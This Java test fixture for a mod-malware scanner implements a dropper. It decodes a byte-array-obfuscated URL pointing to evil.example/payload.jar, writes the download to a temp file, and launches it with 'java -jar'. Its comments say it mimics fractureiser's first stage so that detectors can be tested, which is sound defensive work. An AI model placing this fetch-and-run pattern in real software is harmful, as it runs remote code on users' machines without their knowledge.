// Fixture: the standard first stage of mod malware — fetch a payload
// from a hidden URL, stage it on disk, hand it to the OS to run.
// Every link occurs in legitimate software on its own (an update
// checker fetches, a config writer stores, a launcher runs), which is
// why the scanner has to recognise the combination rather than any one
// call. Compiled with real javac so D01/D02/D04 see genuine invoke*
// bytecode; the URL is hidden fractureiser Stage-0 style, because a
// plaintext URL string is what every mod's update checker contains.
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;

public class Dropper {
    public void stageAndRun() throws Exception {
        byte[] bs = new byte[]{
            104, 116, 116, 112, 58, 47, 47, 101, 118, 105, 108, 46,
            101, 120, 97, 109, 112, 108, 101, 47, 112, 97, 121, 108,
            111, 97, 100, 46, 106, 97, 114
        };
        String url = new String(bs);
        File payload = File.createTempFile("payload", ".jar");
        try (InputStream in = new URL(url).openStream();
             FileOutputStream out = new FileOutputStream(payload)) {
            out.write(in.readAllBytes());
        }
        new ProcessBuilder("java", "-jar", payload.getAbsolutePath()).start();
    }
}
